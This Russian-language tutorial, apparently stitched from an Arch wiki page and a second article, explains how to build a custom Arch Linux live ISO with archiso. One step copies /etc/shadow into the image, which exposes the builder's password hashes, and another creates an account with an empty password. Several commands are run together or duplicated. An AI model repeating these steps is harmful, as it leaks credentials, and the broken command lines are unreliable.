Каталог airootfs действует как наложение, считайте его корневым каталогом '/' в вашей текущей системе, поэтому любые файлы, которые вы размещаете в этом каталоге, будут скопированы при загрузке.

Поэтому, если у вас есть набор скриптов  iptables  в вашей текущей системе, которые вы хотите использовать на вашем live образe, скопируйте их: 

# cp -r /etc/iptables ~/archlive/airootfs/etc



Размещение файлов в домашнем каталоге пользователей немного отличается. Не помещайте их в  airootfs/home , а вместо этого создайте каталог  skel  внутри  airootfs/  и разместите их там. Затем мы добавим соответствующие команды в  customize_airootfs.sh , которые мы собираемся использовать для их копирования при загрузке и выяснения разрешений.

Сначала создайте каталог skel: 
    
# mkdir ~/archlive/airootfs/etc/skel


Теперь скопируйте файлы 'home' в каталог skel, например для  .bashrc : 

# cp ~/.bashrc ~/archlive/airootfs/etc/skel/


Когда выполняется  ~/archlive/airootfs/root/customize_airootfs.sh , и создается новый пользователь, файлы из каталога skel будут автоматически скопированы в новую домашнюю папку, а разрешения будут установлены правильно.


Аналогичным образом, требуется обратить внимание на особые файлы конфигурации, которые находятся где-то внизу по иерархии. В качестве примера конфигурационный файл  /etc/X11/xinit/xinitrc  находится на пути, который может быть перезаписан путем установки пакета. Чтобы поместить файл конфигурации, следует поместить пользовательский xinitrc в  ~/archlive/airootfs/etc/skel/ , а затем изменить  customize_airootfs.sh , чтобы переместить его соответствующим образом. 



Загрузчик

Файл по умолчанию должен работать прекрасно, поэтому вам не нужно трогать его.

Из-за модульной природы isolinux вы можете использовать множество дополнений, так как все *.c32 файлы копируются и доступны вам. Посмотрите официальный сайт syslinux : http://syslinux.zytor.com/wiki/index.php/SYSLINUX  и репозиторий git archiso : https://projects.archlinux.org/archiso.git/tree/configs/syslinux-iso/boot-files . Используя указанные аддоны, можно сделать визуально привлекательные и сложные меню. Для получения дополнительной информации смотрите здесь : http://syslinux.zytor.com/wiki/index.php/Comboot/menu.c32 . 



UEFI Secure Boot

Если вы хотите загружать Archiso в окружении с включённым UEFI Secure Boot, вы должны использовать подписанный загрузчик. Вы можете воспользоваться инструкциями из статьи Secure Boot#Booting an install media : https://wiki.archlinux.org/index.php/Secure_Boot#Booting_an_install_media . 



Вход в систему

Запуск X при загрузке выполняется путем включения службы systemd : https://wiki.archlinux.org/index.php/Systemd_(%D0%A0%D1%83%D1%81%D1%81%D0%BA%D0%B8%D0%B9)  менеджера входа в систему. Если вы знаете, какой файл .service нуждается в символической ссылке: Отлично. Если нет, то вы можете легко узнать в случае, если вы используете одну и ту же программу в системе, в которой вы собираете свой iso. Просто используйте: 

$ ls -l /etc/systemd/system/display-manager.service


Теперь создайте ту же самую символическую ссылку в  ~/archlive/airootfs/etc/systemd/system . Для LXDM: 

# ln -s /usr/lib/systemd/system/lxdm.service ~/archlive/airootfs/etc/systemd/system/display-manager.service



Это позволяeт запустить LXDM при загрузке системы из вашего live образа.

В качестве альтернативы вы можете просто включить службу в  airootfs/root/customize_airootfs.sh  вместе с другими включенными там службами.

Если вы хотите, чтобы графическая среда фактически запускалась автоматически во время загрузки, обязательно отредактируйте  airootfs/root/customize_airootfs.sh  и замените 


systemctl set-default multi-user.target

на

systemctl set-default graphical.target



Изменение автоматического входа в систему

Файлы настроек автоматического входа для getty расположены в  airootfs/etc/systemd/system/getty@tty1.service.d/autologin.conf .

Вы можете отредактировать этот файл для изменения автоматического входа пользователя в систему: 


[Service]
ExecStart=
ExecStart=-/sbin/agetty --autologin isouser --noclear %I 38400 linux


Или удалите его вообще для отключения автоматического входа в систему. 




Сборка ISO

Теперь вы готовы превратить ваши файлы в  .iso, которые вы можете записать на CD или USB:

Сначала создайте каталог  out/

# mkdir ~/archlive/out/


Затем внутри  ~/archlive  выполните:

# ./build.sh -v



Теперь скрипт загрузит и установит пакеты, указанные в  work/*/airootfs , создаст ядро и инициализирует образы, применит ваши настройки и, наконец, создаст iso в  out/. 


Пересборка ISO

Пересборка iso после изменений официально не поддерживается. Однако это легко осуществить, применив два шага. Сначала вам нужно удалить файлы блокировки в рабочем каталоге:

# rm -v work/build.make_*



Кроме того, требуется отредактировать скрипт  airootfs/root/customize_airootfs.sh , и добавить команду id в начале строки  useradd , как показано здесь. В противном случае пересборка останавливается на этом моменте, потому что пользователь, который должен быть добавлен, уже существует FS#41865 : https://bugs.archlinux.org/task/41865 . 



This article or section needs language, wiki syntax or style improvements. See Help:Style for reference.
Tango-edit-clear.png
Reason: Опечатка? (Discuss in Talk:Archiso (Русский)#)


! id arch && useradd -m -p "" -g users -G "adm,audio,floppy,log,network,rfkill,scanner,storage,optical,power,wheel" -s /usr/bin/zsh arch



Также удалите постоянные данные, например созданные пользователями или символические ссылки, такие как  /etc/sudoers .  



Сборку можно немного ускорить, отредактировав скрипт pacstrap (расположенный в  /bin/pacstrap ) и изменив следующее в строке 361:

До:

if ! pacman -r "$newroot" -Sy "${pacman_args[@]}"; then

После:

if ! pacman -r "$newroot" -Sy --needed "${pacman_args[@]}"; then

Это увеличивает скорость первоначальной загрузки, так как не нужно загружать и устанавливать какие-либо основные пакеты, которые уже установлены. 



______________________________________________________


Сборка пользовательского дистрибутива на базе Arch с нуля

Если у вас хватит терпения собрать собственный дистрибутив с нуля, вы должны собирать его поверх Arch Linux. Подход создателей этого дистрибутива позволяет пользователю полностью настраивать свою рабочую среду и делает его идеальной платформой для разработки пользовательских систем.

Вы можете создать пользовательский дистрибутив на базе Arch с помощью утилиты командной строки Archiso, которая представляет собой набор скриптов Bash и достаточно сложна в освоении, но при этом дает вам полный контроль над конечным результатом.

Настройка среды для сборки дистрибутива

Первое, что вам нужно для сборки - это установленный дистрибутив Arch. Инструкций по его инсталляции в сети более чем достаточно, поэтому здесь мы не будем описывать этот процесс.

После установки Arch настройте его в соответствии со своими нуждами. Установите дополнительные пакеты, смените обои и темы оформления, и настройте другие аспекты системы, например сеть. Позже мы скопируем все эти изменения из установленного экземпляра Arch в тот, который мы будем собирать.

После того, как вы настроите свой дистрибутив, откройте терминал и установите зависимости для Archiso:

$ pacman -S make squashfs-tools libisoburn dosfstools patch lynx devtools git 

Теперь скачайте последнюю версию пакета archiso из репозитория Git с помощью команды:

$ git clone git://projects.archlinux.org/archiso.git 

Она скопирует файлы в директорию ~/archiso. Перейдите в эту директорию и установите утилиту с помощью команды make install. После окончания установки вы можете без всяких опасений удалить директорию ~/archiso. Далее, создадим директорию, в которой мы будем настраивать файлы для нашего будущего дистрибутива:

$ mkdir ~/archlive 

Убедитесь, что у вас достаточно свободного дискового пространства для размещения всех приложений, которые вы хотите установить, а также любых других файлов, которые вы решите поместить в свой дистрибутив.

Теперь вам нужно скопировать один из двух профилей Archiso. Профиль baseline хорош для создания базовой live-системы без предустановленных пакетов. Мы будем использовать профиль releng, который позволяет создать полностью настроенный под свои нужды Arch Linux с предустановленными приложениями. Для использования этих скриптов просто скопируйте их в директорию ~/archlive:

# cp -r /usr/share/archiso/configs/profile/ archlive

Добавление пакетов

Добавлять пакеты в ISO-образ с помощью Archiso также просто, как добавлять их в текстовый файл, по одному пакету на строку. В директории ~/archlive у нас три файла: packages.i686, packages.x86_64 и packages.both. Вы можете открыть их в текстовом редакторе и добавить названия пакетов, которые вы хотите включить в дистрибутив. Archiso будет считывать содержимое файла для соответствующей архитектуры и затем упаковывать их в образ, который будет работать как на 32-х, так и на 64-битных машинах. Тем не менее, для обеспечения согласованности, мы рекомендуем вам добавлять название пакетов в файл packages.both, чтобы они были доступны для обеих архитектур.

Файл packages.both уже содержит определенный набор пакетов. Вы должны оставить их там, и добавлять свои пакеты в конец файла. Вы можете вывести список всех установленных в системе пакетов с помощью команды:

$ pacman -Qqe 

И затем скопировать те, которые вам нужны. Вы можете создать базовую систему с рабочим столом Mate, менеджером входа в систему и браузером Firefox, добавив в файл packages.both следующие пакеты:

xorg-server xorg-xinit xorg-server-utils xf86-video-vesa slim mate firefox 

Вы также можете скопировать в файл packages.both все пакеты, установленные в системе, с помощью команды:

$ pacman -Qqe >> ~/archlive/packages.both 

Настройка корневой директории

Директория airootfs внутри ~/archlive/ служит оверлеем для того, что будет находиться в корневой директории нового дистрибутива. Любые файлы, которые вы поместите в эту директорию, будут добавлены в файловую систему дистрибутива, поэтому, если вы используете менеджер входа Slim, скопируйте его конфигурационный файл:

$ cp /etc/slim.conf ~/archlive/airootfs/etc/ 

Аналогично, вам необходимо скопировать файл /etc/systemd/system/display-manager.service в соответствующее место внутри ~/archlive/airootfs/, а также директории, в которых хранятся темы оформления, а именно /usr/share/backgrounds, /usr/share/icons и /usr/share/themes.

Если вы хотите, чтобы новый дистрибутив имел тот же набор пользователей, скопируйте соответствующие файлы:

$ cp /etc/{shadow,passwd,group} ~/archlive/airootfs/etc/ 

Перед тем, как копировать любые файлы из домашней директории пользователя, необходимо создать директорию skel:

$ mkdir ~/archlive/airootfs/etc/skel 

Эта директория отображает домашнюю директорию пользователя во время подготовки системы. Теперь вы можете копировать файлы из домашней директории:

$ cp ~/.bashrc ~/archlive/airootfs/etc/skel/ 

Таким образом, вы можете скопировать любые файлы или папки из своей домашней директории в директорию skel, включая ~/.xinitrc и ~/.config.

Для того, чтобы автоматически авторизовываться в системе от имени обычного пользователя, а не root, откройте файл ~/archlive/airootfs/etc/systemd/system/getty@tty1.service.d/autologin.conf в текстовом редакторе и отредактируйте следующую строку:

$ cp ~/.bashrc ~/archlive/airootfs/etc/skel/ 

ExecStart=-/sbin/agetty --autologin bodhi --noclear %I 38400 linux

Замените bodhi на свое имя пользователя.

Заключительные настройки

В домашней директории root (~/archlive/airootfs/root) есть файл customize-root-image.sh. Любая задача по администрированию систему, которую вы хотели бы выполнять после установки Arch, может быть добавлена в этот файл. Помните, что инструкции в этом файле должны составляться для нового окружения, то есть / в скрипте должна относиться к корневой директории собираемого дистрибутива.

Откройте файл в текстовом редакторе, найдите строку с /etc/localtime и задайте свой часовой пояс:

$ ln -sf /usr/share/zoneinfo/Europe/London /etc/localtime 

Также убедитесь, что в качестве командной оболочки установлен Bash:

$ usermod -s /usr/bin/bash root 

Затем скопируйте содержимое директории skel в свою пользовательскую домашнюю директорию:

$ cp -aT /etc/skel/ /home/bodhi/ 

и задайте правильного владельца этих файлов:

$ chown bodhi:users /home/bodhi -R 

В двух последних командах замените bodhi на свое имя пользователя.

Наконец, прокрутите страницу вниз, до конца файла, и закомментируйте все команды systemctl, добавив перед ними символ #. Чтобы загружаться в графический интерфейс, добавьте следующие строки для запуска всех нужных служб:

systemctl enable pacman-init.service choose-mirror.service systemctl set-default graphical.targetsystemctl enable graphical.target 

Это все. Теперь вам нужно собрать образ дистрибутива. Перейдите в директорию ~/archlive и запустите нижеприведенную команду для запуска процесса сборки:

$ ./build.sh -v -N EduArch -V 1.0 -L EduArch_1.0 

Ключ -v включает режим вывода подробной информации о процессе, -N задает имя ISO-образа, -V задает версию, в а -L добавляет метку в сгенерированный ISO.

Обратите внимание, что процесс сборки достаточно медленный, и может занять до нескольких часов в зависимости от мощности вашего компьютера. После завершения вы найдете ISO-образ в директории ~/archlive/out.

Обновление образов

Через некоторое время после сборки образа вы захотите обновить его. Возможно выйдут новые версии приложений, или вам понадобится изменить какие-либо файлы, которые вы добавляли в образ вручную.
Для этого перейдите в директорию ~/archlive/work. Директории i686 и x86_64 внутри work содержат файловые системы для соответствующих архитектур. Вы можете сменить корневую директорию на одну из них с помощью команды:

$ arch-chroot ~/archlive/work/x86_64/root-image 

или

$ arch-chroot ~/archlive/work/i686/root-image 

Теперь, изнутри, вы можете делать любые обновления или изменения системы. Если вы хотите обновить приложения, то сначала обновите базу данных ключей пакетного менеджера и список пакетов:

$ pacman-key --init $ pacman-key --populate 

После чего можете обновить систему с помощью команды:

$ pacman -Syu 

Сделав необходимые изменения, выйдите из окружения chroot.

$ exit 

Не забудьте сделать эти изменения для обеих архитектур. Теперь необходимо заново собрать образ. Однако скрипт build.sh, так как мы уже в директории work. Чтобы заставить его все-таки собрать новый образ, откройте файл build.sh в текстовом редакторе. Перейдите в конец файла и удалите параметр run_once из начала команд make_prepare и make_iso:

for arch in i686 x86_64; do make_preparedonemake_iso 

Сохраните файл и запустите скрипт для создания образа:

$ ./build.sh -v -N EduArch -V 2.0 -L EduArch_2.0

